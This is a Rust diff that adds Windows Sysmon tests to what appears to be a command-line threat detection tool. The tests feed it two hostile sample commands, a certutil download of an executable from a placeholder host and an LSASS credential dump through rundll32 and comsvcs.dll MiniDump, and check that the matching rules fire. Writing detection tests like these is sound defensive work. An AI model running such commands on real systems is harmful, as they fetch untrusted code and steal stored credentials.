@@ -82,7 +82,36 @@ mod tests {
     use super::*;
 
     fn kb() -> KnowledgeBase {
-        kb::load().expect("embedded KB must parse")
+        kb::load(kb::Platform::LinuxAuditd).expect("embedded KB must parse")
+    }
+
+    fn win_kb() -> KnowledgeBase {
+        kb::load(kb::Platform::WindowsSysmon).expect("windows KB must parse")
+    }
+
+    #[test]
+    fn windows_kb_detects_lolbin_and_normalizes_exe_path() {
+        // .exe extension and a full Windows path must still resolve to certutil.
+        let report = analyze(
+            "C:\\Windows\\System32\\certutil.exe -urlcache -f http://x/a.exe a.exe",
+            &win_kb(),
+        );
+        assert_eq!(report.platform, "windows-sysmon");
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "certutil-download")
+        );
+    }
+
+    #[test]
+    fn windows_kb_detects_lsass_dump() {
+        let report = analyze(
+            "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 660 lsass.dmp full",
+            &win_kb(),
+        );
+        assert!(report.findings.iter().any(|f| f.rule_id == "lsass-comsvcs"));
     }
 
     #[test]
